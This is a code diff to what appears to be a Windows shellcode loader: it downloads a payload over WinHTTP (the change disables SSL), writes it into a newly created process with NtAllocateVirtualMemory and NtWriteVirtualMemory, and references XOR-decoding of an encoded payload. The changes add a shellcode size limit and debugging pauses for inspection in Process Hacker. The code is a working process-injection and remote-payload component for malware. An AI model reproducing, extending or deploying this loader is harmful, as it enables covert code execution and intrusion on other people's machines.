@@ -9,6 +9,8 @@
 
 #define DEBUGGING 1
 
+#define MAXSHELLCODESIZE 4096
+
 #define _CRT_SECURE_NO_DEPRECATE
 #define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
 
@@ -104,7 +106,7 @@ BOOL checkup()
 
 }
 
-int main()
+int main(int argc, char **argv)
 {
     if (!checkup()) {
         fprintf(stderr, "Bailing out\n");
@@ -125,6 +127,13 @@ int main()
 #endif
 
     unsigned int shellcode_size = (unsigned int)shellcode.size();
+#ifdef DEBUGGING
+	printf("Shellcode size is %d\n", shellcode_size);
+#endif
+	if (shellcode_size > MAXSHELLCODESIZE) {
+		fprintf(stderr, "Shellcode is too big (%d), maximum size is %d\n", shellcode_size, MAXSHELLCODESIZE);
+		return 0;
+	}
 
     // create startup info struct
     LPSTARTUPINFOW startup_info = new STARTUPINFOW();
@@ -150,6 +159,11 @@ int main()
         startup_info,
         process_info);
 
+#ifdef DEBUGGING
+	fprintf(stderr, "process (%d) created, check with processhacker (press ENTER to continue)\n", GetProcessId(process_info->hProcess));
+	getchar();
+#endif
+
     // Allocate Virtual Memory
     code_size = (SIZE_T)shellcode_size;
     ntstatus = NtAllocateVirtualMemory(process_info->hProcess, &start_address, 0, &code_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -161,13 +175,17 @@ int main()
     }
     else {
 #ifdef DEBUGGING
-        fprintf(stderr, "Virtual Memory allocated at %llx, allocated size %d\n", (unsigned __int64)start_address, (unsigned int)code_size);
+        fprintf(stderr, "Virtual Memory allocated at %llx, allocated size %d, check with processhacker (press ENTER to continue)\n", (unsigned __int64)start_address, (unsigned int)code_size);
+		getchar();
 #endif
     }
 
+	unsigned char buf[MAXSHELLCODESIZE];
+	memcpy(buf, &shellcode[0], shellcode_size);
+
     // do_xor(encoded_kwdikas, sizeof(encoded_kwdikas), key, sizeof(key));
     // Copy shellcode into allocated memory
-    ntstatus = NtWriteVirtualMemory(process_info->hProcess, start_address, (PVOID)&shellcode[0], shellcode_size, 0);
+    ntstatus = NtWriteVirtualMemory(process_info->hProcess, start_address, (PVOID)buf, shellcode_size, 0);
     if (!NT_SUCCESS(ntstatus)) {
 #ifdef DEBUGGING
         fprintf(stderr, "NtWriteVirtualMemory error, ntstatus is %d\n", ntstatus);
@@ -176,7 +194,8 @@ int main()
     }
     else {
 #ifdef DEBUGGING
-        fprintf(stderr, "Memory Written\n");
+        fprintf(stderr, "Memory Written, check with processhacker (press ENTER to continue)\n");
+		getchar();
 #endif
     }
 
@@ -237,8 +256,8 @@ std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {
         WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,    // proxy aware
         WINHTTP_NO_PROXY_NAME,
         WINHTTP_NO_PROXY_BYPASS,
-//        0); // no ssl
-        WINHTTP_FLAG_SECURE_DEFAULTS);          // enable ssl
+        0); // no ssl
+//        WINHTTP_FLAG_SECURE_DEFAULTS);          // enable ssl
 
         // create session for target
     HINTERNET hConnect = WinHttpConnect(
